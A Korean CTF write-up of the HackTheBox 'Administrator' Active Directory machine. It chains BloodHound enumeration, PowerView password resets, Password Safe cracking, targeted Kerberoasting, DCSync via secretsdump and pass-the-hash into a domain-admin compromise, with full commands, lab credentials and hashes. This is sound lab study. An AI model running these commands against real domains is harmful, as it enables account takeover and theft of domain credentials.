# HTB-ADMINISTRATOR
```bash
OS: Windows(AD)
DATE: 26.10.16
DIFFICULTY: Medium
```

## RECON
초기 침투 전, 이 머신은 먼저 Olivia라는 user와 password를 제공해주고 시작하였다

**nmap**: 초기 정찰을 위해 전체 포트 검사 및 상세 검사를 진행하였다
```bash
nmap -p- -T4 IP | grep -oP '^\d+/tcp' | cut -d/ -f1 | paste -sd,
```
```bash
nmap -sC -sV -p 21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49668,52675,52680,52690,52702,52735,54843 IP
```
검사 결과 88 kerberos, 389 포트가 있는 것으로 보아 AD DC 서버인 것 같았다. 특히 21번 포트가 눈에 띄었다. 일단 현재 얻은 자격증명으로 bloodhound와 nxc smb를 활용하여 열거를 진행하였다
```bash
bloodhound-python -u Olivia -p ichliebedich -d administrator.htb -ns IP -c all
```
```bash
nxc smb administrator.htb -u olivia -p ichliebedich --shares
```
먼저 smb 폴더에는 별다른 내용을 발견하지 못하였다

## Initial Access
smb에서 내용을 찾지 못하고 bloodhound 결과를 확인해본 결과, olivia의 outbound를 확인해보니 **Michael**이라는 유저와 GenericAll 관계라는 것을 알게 되었다

![michael](attach_real/Pasted%20image%2020261021214121.png)

따라서 windows abuse를 사용하기 위해 olivia가 winrm이 가능한지 확인해보았다
```bash
nxc ip winrm -u olivia -p ichliebedich
```
그 결과 접속할 수 있어서 쉘로 접속해주었다
```bash
evil-winrm -i administrator.htb -u olivia -p ichliebedich
```
이후 GenericAll 권한을 악용하기 위해 로컬에 있는 `PowerView.ps1`를 쉘로 옮겨주었다
```ps1
certutil -split -f -urlcache http://IP:9999/PowerView.ps1
```
따라서 windows abuse에 나온 대로 Michael이라는 유저의 비밀번호를 바꿔주었다
```ps1
$SecPassword = ConvertTo-SecureString 'ichliebedich' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('administrator.htb\olivia', $SecPassword)
```
```ps1
$UserPassword = ConvertTo-SecureString 'ichliebedich' -AsPlainText -Force
```
```ps1
Set-DomainUserPassword -Identity michael -AccountPassword $UserPassword -Credential $Cred
```
따라서 비밀번호를 바꿔준 후 nxc를 사용하여 확인해주었다
```bash
nxc smb IP -u michael -p ichliebedich
```
그 결과 새로운 유저 크레덴셜을 얻게 되었다. michael도 마찬가지로 bloodhound에서 확인해본 결과 하나의 outbound가 있었다

![michael](attach_real/Pasted%20image%2020261021214758.png)

michael은 benjamin이라는 유저와 **ForceChangePassword** 관계이기에, 똑같이 쉘에 접속하여 benjamin이라는 유저의 비밀번호를 바꿔주었다
```bash
evil-winrm -i IP -u michael -p ichliebedich
```
```ps1
$SecPassword = ConvertTo-SecureString 'ichliebedich' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('administrator.htb\michael', $SecPassword)
```
```ps1
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
```
```ps1
Set-DomainUserPassword -Identity benjamin -AccountPassword $UserPassword -Credential $Cred
```
따라서 benjamin 유저의 크레덴셜이 바뀌었는지 확인해보았다
```bash
nxc smb IP -u benjamin -p Password123!
```
다행히 benjamin 유저 또한 크레덴셜을 얻는 데 성공하였다. 이후 마찬가지로 bloodhound를 확인해본 결과, 아쉽게 benjamin 유저에게는 outbound가 없었다. 따라서 대상 유저의 계정으로, 아까 발견할 수 있었던 ftp 서비스에 접속해보았다
```bash
ftp IP
Name (IP:root): benjamin
Password: Password123!

ftp> ls
229 Entering Extended Passive Mode (|||65266|)
125 Data connection already open; Transfer starting.
10-05-24  09:13AM                  952 Backup.psafe3
ftp> bin
ftp> get Backup.psafe3
```
확인 결과 다행히 접속이 가능했고, 안에 Backup.psafe3이라는 파일이 있어 bin은 설정해주고 로컬로 옮겨주었다. 로컬에서 다시 한 번 확인해보니 암호화가 걸린 DB 같았다. 따라서 좀 더 찾아본 결과 .psafe3을 열려면 패스워드가 필요했다. 따라서 [pwsafe2john.py](https://github.com/willstruggle/john/blob/master/pwsafe2john.py)라는 도구로 해시 처리해준 후 john으로 crack할 생각이었다. 따라서 먼저 해시화를 진행해주었다
```bash
python2 pwsafe2john.py Backup.psafe3 > hash
```
그 결과 john용 hash가 나왔다. 따라서 john을 돌려보았다
```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```
하지만 시간이 엄청나게 지났음에도 불구하고 크랙하지 못하고 있었다. 따라서 좀 더 빠른 도구인 hashcat을 이용해보기로 하였다. hashcat은 해시화 필요 없이 db 파일을 바로 넣으면 db 암호를 크랙한다. 따라서 hashcat mode 5200을 사용하여 크랙을 진행하였다
```bash
hashcat -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt
```
그 결과 DB의 비밀번호를 얻을 수 있었다. 이제 이 db를 dump할 수 있는 도구를 찾아보았다. 찾아본 결과 [psafe3dump](https://github.com/marcbutler/libpsafe3)라는 dumper를 찾을 수 있었다. 따라서 환경을 세팅해주고 실행시켜보았다
```bash
cmake -B build
cmake --build build
ctest --test-dir build
```
```bash
psafe3dump Backup.psafe3 PASS

type=01  len= 16  512230f1-0a83-493b-8fbd-d46aa200bdcf
type=03  len= 15  Emily Rodriguez
type=04  len=  5  emily
type=06  len= 29  UXLCI5iETUsIBoFVTj8yQFKoHjXmb
type=07  len=  4  2024-08-23T07:26:53Z
```
그 결과 여러 유저의 이름과, 비밀번호와 비슷하게 생긴 문구를 찾을 수 있었다. 처음에는 받은 패스워드가 암호화되어 있다고 생각해 hash id를 찾아보고 하였지만 아무런 결과도 나오지 않아, 이 상태 그대로 nxc를 통해 접속이 가능한지 살펴보았다
```bash
nxc IP smb -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
```
그 결과 emily라는 유저의 크레덴셜을 얻을 수 있었다. 또한 쉘 접속도 가능하여 user flag도 얻을 수 있었다

![user](attach_real/Pasted%20image%2020261021121725.png)

## Privilege Escalation
이후 아까와 마찬가지로 emily라는 유저의 bloodhound를 살펴보았다

![emily](attach_real/Pasted%20image%2020261021214155.png)

확인 결과 emily라는 유저가 ethan이라는 유저와 GenericWrite 관계라는 것을 알게 되었다. 따라서 이번에는 linux abusing을 진행하였다
```bash
sudo timedatectl set-ntp off
sudo rdate -n 10.129.86.22
Wed Oct 21 19:20:31 KST 2026
```
시작하기 전 머신과 같은 시간대로 맞춰준 후 공격을 진행하였다
```bash
python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (ethan)
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$c699497e033e80
```
그 결과 kerberoast hash를 얻게 되었다. 따라서 hashcat 13100 모드로 crack을 진행하였다
```bash
hashcat -m 13100 ethan_hash /usr/share/wordlists/rockyou.txt
```
따라서 ethan 유저의 비밀번호까지 얻게 되었다. 다시 한 번 더 마찬가지로 ethan 유저의 bloodhound outbound를 확인해보았다

![ethan](attach_real/Pasted%20image%2020261021214215.png)

확인 결과 ethan 유저가 도메인과 Get-Changes로 연결된 것을 알게 되었다. 즉 DCSync가 가능하다는 것이다. 따라서 이것 또한 linux abusing을 사용하여 권한 상승을 진행하였다
```bash
secretsdump.py 'administrator.htb'/'ethan':'limpbizkit'@'administrator.htb'

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
```
그 결과 admin의 NTLM 해시를 얻게 되어 PTH를 할 수 있게 되었다. 따라서 winrm으로 admin 계정에 접속한 결과 root flag를 얻을 수 있게 되었다
```bash
evil-winrm -i IP -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```

![root](attach_real/Pasted%20image%2020261021193205.png)


## New Inform
- GenericAll: 어떤 객체(컴퓨터, 유저 등등)에 대한 모든 권한
- 항상 python3 안 되면 그냥 python2, python 다 시도해라
- 무조건 2john으로 해시화하고 john으로 돌릴 생각하지 말고, 항상 hashcat mode가 몇 번인지도 확인하자
- john보다 hashcat이 더 빠를 확률 높음
- 항상 hash를 꼼꼼히 확인해보자. 뭐가 묻었을 수도 있음
- 항상 암호화라는 생각은 버리자
- DCSync: 도메인에 DC가 여러 대 있으면 서로 비밀번호 데이터를 복제해야 한다. 이 복제에 쓰는 프로토콜이 MS-DRSR이다. 복제 요청을 받아주려면 DC 입장에서 이 요청자가 복제할 자격이 있는지 확인한다. 그 자격이 Get-Changes(DS-Replication-Get-Changes / Get-Changes-All) 권한이다